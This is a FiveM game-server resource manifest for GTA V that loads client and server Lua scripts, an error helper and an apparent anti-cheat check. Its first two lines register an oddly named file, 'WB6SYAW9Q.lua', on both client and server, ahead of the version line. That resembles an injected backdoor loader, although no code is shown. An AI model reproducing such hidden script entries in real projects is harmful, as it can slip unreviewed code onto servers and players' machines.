server_script "WB6SYAW9Q.lua"
client_script "WB6SYAW9Q.lua"
fx_version("cerulean")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

game("gta5")
lua54("yes")

client_scripts({
	"client/*.lua",
})
server_scripts({
	"server/*.lua",
})
